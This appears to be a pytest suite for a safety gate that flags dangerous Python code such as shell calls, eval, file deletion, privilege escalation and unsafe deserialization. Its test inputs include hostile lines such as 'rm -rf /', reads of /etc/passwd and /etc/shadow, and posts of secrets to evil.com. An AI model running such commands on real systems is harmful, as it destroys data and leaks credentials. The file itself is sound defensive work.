"""Tests for aegis.core.code_exec_safety — dangerous code pattern detection."""

from __future__ import annotations

import pytest

from aegis.core.code_exec_safety import (
    Category,
    CodeExecFinding,
    CodeExecResult,
    CodeExecSafetyGate,
    ExecAction,
    Severity,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def gate() -> CodeExecSafetyGate:
    """Default gate with medium sensitivity."""
    return CodeExecSafetyGate()


@pytest.fixture()
def gate_high() -> CodeExecSafetyGate:
    """Gate with high sensitivity (only high/critical findings)."""
    return CodeExecSafetyGate(sensitivity="high")


@pytest.fixture()
def gate_low() -> CodeExecSafetyGate:
    """Gate with low sensitivity (reports everything)."""
    return CodeExecSafetyGate(sensitivity="low")


# ---------------------------------------------------------------------------
# Clean code passes
# ---------------------------------------------------------------------------


class TestCleanCode:
    def test_empty_string(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("")
        assert result.passed
        assert result.action == "allow"

    def test_whitespace_only(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("   \n\t\n  ")
        assert result.passed

    def test_simple_math(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("x = 1 + 2\ny = x * 3\nprint(y)")
        assert result.passed

    def test_safe_imports(self, gate: CodeExecSafetyGate) -> None:
        code = "import json\nimport math\nresult = json.dumps({'key': math.pi})"
        result = gate.check(code)
        assert result.passed

    def test_list_comprehension(self, gate: CodeExecSafetyGate) -> None:
        code = "squares = [x**2 for x in range(10)]"
        result = gate.check(code)
        assert result.passed

    def test_class_definition(self, gate: CodeExecSafetyGate) -> None:
        code = "class Foo:\n    def bar(self):\n        return 42"
        result = gate.check(code)
        assert result.passed


# ---------------------------------------------------------------------------
# Shell injection detection
# ---------------------------------------------------------------------------


class TestShellInjection:
    def test_os_system(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("import os\nos.system('rm -rf /')")
        assert not result.passed
        cats = {f.category for f in result.findings}
        assert Category.SHELL_INJECTION in cats

    def test_subprocess_run(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("import subprocess\nsubprocess.run(['ls', '-la'])")
        assert not result.passed
        names = {f.pattern_name for f in result.findings}
        assert any("subprocess" in n for n in names)

    def test_subprocess_popen(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("subprocess.Popen('echo pwned', shell=True)")
        assert not result.passed

    def test_os_popen(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("os.popen('cat /etc/passwd').read()")
        assert not result.passed

    def test_backtick_execution(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("output = `whoami`")
        assert not result.passed
        cats = {f.category for f in result.findings}
        assert Category.SHELL_INJECTION in cats


# ---------------------------------------------------------------------------
# Code injection detection
# ---------------------------------------------------------------------------


class TestCodeInjection:
    def test_eval_call(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("result = eval(user_input)")
        assert not result.passed
        cats = {f.category for f in result.findings}
        assert Category.CODE_INJECTION in cats

    def test_exec_call(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("exec('print(42)')")
        assert not result.passed

    def test_compile_call(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("code = compile(src, '<string>', 'exec')")
        assert not result.passed

    def test_dunder_import(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("mod = __import__('os')")
        assert not result.passed

    def test_nested_eval_in_function(self, gate: CodeExecSafetyGate) -> None:
        code = "def process(data):\n    cleaned = data.strip()\n    return eval(cleaned)\n"
        result = gate.check(code)
        assert not result.passed
        # AST should catch eval inside a function
        ast_findings = [f for f in result.findings if f.pattern_name.startswith("ast_")]
        assert any("eval" in f.pattern_name for f in ast_findings)


# ---------------------------------------------------------------------------
# File system danger detection
# ---------------------------------------------------------------------------


class TestFileSystemDanger:
    def test_os_remove(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("os.remove('/tmp/important.db')")
        assert not result.passed
        cats = {f.category for f in result.findings}
        assert Category.FILE_SYSTEM_DANGER in cats

    def test_shutil_rmtree(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("import shutil\nshutil.rmtree('/var/data')")
        assert not result.passed

    def test_open_write_sensitive(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("f = open('/etc/passwd', 'w')")
        assert not result.passed


# ---------------------------------------------------------------------------
# Network exfiltration detection
# ---------------------------------------------------------------------------


class TestNetworkExfiltration:
    def test_requests_post(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("requests.post('https://evil.com', data=secrets)")
        assert not result.passed
        cats = {f.category for f in result.findings}
        assert Category.NETWORK_EXFILTRATION in cats

    def test_httpx_post(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("httpx.post('https://evil.com/exfil', json=data)")
        assert not result.passed

    def test_urllib_urlopen(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("urllib.request.urlopen('https://evil.com?d=' + secret)")
        assert not result.passed

    def test_socket_connect(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
        assert not result.passed


# ---------------------------------------------------------------------------
# Privilege escalation detection
# ---------------------------------------------------------------------------


class TestPrivilegeEscalation:
    def test_os_setuid(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("os.setuid(0)")
        assert not result.passed
        cats = {f.category for f in result.findings}
        assert Category.PRIVILEGE_ESCALATION in cats

    def test_os_chmod(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("os.chmod('/tmp/script.sh', 0o777)")
        assert not result.passed

    def test_ctypes_usage(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("import ctypes\nctypes.cdll.LoadLibrary('libevil.so')")
        assert not result.passed

    def test_os_kill(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("os.kill(pid, 9)")
        assert not result.passed


# ---------------------------------------------------------------------------
# Deserialization detection
# ---------------------------------------------------------------------------


class TestDeserialization:
    def test_pickle_loads(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("import pickle\nobj = pickle.loads(data)")
        assert not result.passed
        cats = {f.category for f in result.findings}
        assert Category.DESERIALIZATION in cats

    def test_yaml_load(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("import yaml\nconfig = yaml.load(raw)")
        assert not result.passed

    def test_marshal_loads(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("import marshal\ncode = marshal.loads(data)")
        assert not result.passed

    def test_shelve_open(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("import shelve\ndb = shelve.open('data.db')")
        assert not result.passed


# ---------------------------------------------------------------------------
# AST analysis — nested / complex cases
# ---------------------------------------------------------------------------


class TestASTAnalysis:
    def test_nested_call_in_loop(self, gate: CodeExecSafetyGate) -> None:
        code = "for item in items:\n    result = eval(item)\n    print(result)\n"
        result = gate.check(code)
        assert not result.passed
        ast_findings = [f for f in result.findings if f.pattern_name.startswith("ast_")]
        assert len(ast_findings) >= 1

    def test_call_in_try_except(self, gate: CodeExecSafetyGate) -> None:
        code = "try:\n    os.system('ls')\nexcept Exception:\n    pass\n"
        result = gate.check(code)
        assert not result.passed

    def test_multiple_dangerous_calls(self, gate: CodeExecSafetyGate) -> None:
        code = "import os, subprocess\nos.system('id')\nsubprocess.run(['whoami'])\neval('2+2')\n"
        result = gate.check(code)
        assert not result.passed
        assert len(result.findings) >= 3

    def test_ast_reports_line_numbers(self, gate: CodeExecSafetyGate) -> None:
        code = "x = 1\ny = eval('x + 1')\n"
        result = gate.check(code)
        ast_findings = [f for f in result.findings if f.pattern_name.startswith("ast_")]
        assert any(f.line_number == 2 for f in ast_findings)

    def test_invalid_python_falls_back_to_regex(self, gate: CodeExecSafetyGate) -> None:
        # Not valid Python, but regex should still catch it
        code = "os.system('rm -rf /') &&& invalid syntax @@@"
        result = gate.check(code)
        assert not result.passed
        # All findings should be regex-based since AST parse fails
        assert all(f.pattern_name.startswith("regex_") for f in result.findings)

    def test_dangerous_import_detected(self, gate: CodeExecSafetyGate) -> None:
        code = "import pickle\ndata = b'\\x80\\x03'"
        result = gate.check(code)
        assert not result.passed
        import_findings = [f for f in result.findings if "import" in f.pattern_name]
        assert len(import_findings) >= 1


# ---------------------------------------------------------------------------
# Sensitivity levels
# ---------------------------------------------------------------------------


class TestSensitivity:
    def test_high_sensitivity_ignores_medium(self, gate_high: CodeExecSafetyGate) -> None:
        # urllib.request.urlopen is MEDIUM severity
        code = "urllib.request.urlopen('https://example.com')"
        result = gate_high.check(code)
        # High sensitivity should skip medium findings
        medium_findings = [f for f in result.findings if f.severity == Severity.MEDIUM]
        assert len(medium_findings) == 0

    def test_high_sensitivity_catches_critical(self, gate_high: CodeExecSafetyGate) -> None:
        result = gate_high.check("os.system('id')")
        assert not result.passed

    def test_low_sensitivity_catches_everything(self, gate_low: CodeExecSafetyGate) -> None:
        code = "urllib.request.urlopen('https://example.com')"
        result = gate_low.check(code)
        assert not result.passed

    def test_medium_is_default(self) -> None:
        gate = CodeExecSafetyGate()
        # Medium severity findings should be reported
        result = gate.check("urllib.request.urlopen('https://example.com')")
        assert not result.passed


# ---------------------------------------------------------------------------
# Allowlist functionality
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_allowlist_exempts_pattern(self) -> None:
        gate = CodeExecSafetyGate(allowlist=["eval"])
        result = gate.check("result = eval('2 + 2')")
        # eval should be exempted — both AST "eval" name match and regex
        eval_findings = [f for f in result.findings if "eval" in f.pattern_name]
        assert len(eval_findings) == 0

    def test_allowlist_does_not_exempt_others(self) -> None:
        gate = CodeExecSafetyGate(allowlist=["eval"])
        result = gate.check("exec('print(1)')")
        assert not result.passed

    def test_allowlist_regex_pattern_name(self) -> None:
        gate = CodeExecSafetyGate(allowlist=["regex_os_system"])
        # Regex pattern is exempted but AST still catches it
        code = "os.system('ls')"
        result = gate.check(code)
        regex_findings = [f for f in result.findings if f.pattern_name == "regex_os_system"]
        assert len(regex_findings) == 0
        # AST finding should still be present
        ast_findings = [f for f in result.findings if f.pattern_name.startswith("ast_")]
        assert len(ast_findings) >= 1

    def test_allowlist_import(self) -> None:
        gate = CodeExecSafetyGate(allowlist=["pickle"])
        code = "import pickle\nobj = pickle.loads(data)"
        result = gate.check(code)
        # pickle should be allowlisted for both AST import and call
        ast_findings = [
            f
            for f in result.findings
            if "pickle" in f.pattern_name and f.pattern_name.startswith("ast_")
        ]
        assert len(ast_findings) == 0

    def test_empty_allowlist(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("eval('1')")
        assert not result.passed


# ---------------------------------------------------------------------------
# Data model properties
# ---------------------------------------------------------------------------


class TestDataModels:
    def test_finding_is_frozen(self) -> None:
        finding = CodeExecFinding(
            category=Category.CODE_INJECTION,
            severity=Severity.CRITICAL,
            pattern_name="test",
            matched_text="eval()",
            line_number=1,
            description="test finding",
        )
        with pytest.raises(AttributeError):
            finding.severity = Severity.LOW  # type: ignore[misc]

    def test_result_is_frozen(self) -> None:
        result = CodeExecResult(passed=True)
        with pytest.raises(AttributeError):
            result.passed = False  # type: ignore[misc]

    def test_result_findings_tuple(self, gate: CodeExecSafetyGate) -> None:
        result = gate.check("eval('x')")
        assert isinstance(result.findings, tuple)

    def test_severity_enum_values(self) -> None:
        assert Severity.CRITICAL == "critical"
        assert Severity.HIGH == "high"
        assert Severity.MEDIUM == "medium"
        assert Severity.LOW == "low"

    def test_category_enum_values(self) -> None:
        assert Category.SHELL_INJECTION == "shell_injection"
        assert Category.DESERIALIZATION == "deserialization"

    def test_action_enum_values(self) -> None:
        assert ExecAction.BLOCK == "block"
        assert ExecAction.WARN == "warn"
        assert ExecAction.LOG == "log"


# ---------------------------------------------------------------------------
# Action configuration
# ---------------------------------------------------------------------------


class TestActionConfig:
    def test_default_action_is_block(self) -> None:
        gate = CodeExecSafetyGate()
        result = gate.check("eval('x')")
        assert result.action == "block"

    def test_warn_action(self) -> None:
        gate = CodeExecSafetyGate(action="warn")
        result = gate.check("eval('x')")
        assert result.action == "warn"

    def test_log_action(self) -> None:
        gate = CodeExecSafetyGate(action="log")
        result = gate.check("eval('x')")
        assert result.action == "log"

    def test_clean_code_always_allow(self) -> None:
        gate = CodeExecSafetyGate(action="block")
        result = gate.check("x = 1 + 2")
        assert result.action == "allow"


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------


class TestEdgeCases:
    def test_multiline_dangerous_code(self, gate: CodeExecSafetyGate) -> None:
        code = (
            "import os\n"
            "import subprocess\n"
            "\n"
            "# Step 1\n"
            "os.system('whoami')\n"
            "\n"
            "# Step 2\n"
            "subprocess.run(['cat', '/etc/shadow'])\n"
        )
        result = gate.check(code)
        assert not result.passed
        assert len(result.findings) >= 2

    def test_severity_is_max_of_findings(self, gate: CodeExecSafetyGate) -> None:
        # os.system is CRITICAL, compile is HIGH
        code = "os.system('ls')\ncompile('x', '', 'exec')"
        result = gate.check(code)
        assert result.severity == Severity.CRITICAL

    def test_comment_with_dangerous_name_regex_only(self, gate: CodeExecSafetyGate) -> None:
        # Comments are not code, but regex will still match the text.
        # AST should NOT flag a comment since the parser ignores them.
        code = "# os.system('ls')\nx = 42"
        result = gate.check(code)
        # AST should NOT produce findings for the comment
        ast_findings = [f for f in result.findings if f.pattern_name.startswith("ast_")]
        assert len(ast_findings) == 0

    def test_string_containing_dangerous_name(self, gate: CodeExecSafetyGate) -> None:
        # A string literal containing "os.system" — regex catches it,
        # but AST correctly sees it's just a string, not a call.
        code = 'msg = "do not use os.system() in production"'
        result = gate.check(code)
        ast_findings = [f for f in result.findings if f.pattern_name.startswith("ast_")]
        assert len(ast_findings) == 0

    def test_deduplication(self, gate: CodeExecSafetyGate) -> None:
        # Same call detected by both AST and regex — should be deduplicated
        # by (pattern_name, line_number), so ast_ and regex_ are distinct
        code = "eval('1+1')"
        result = gate.check(code)
        pattern_names = [f.pattern_name for f in result.findings]
        # Should have both an ast and regex finding with different names
        assert len(set(pattern_names)) == len(pattern_names)
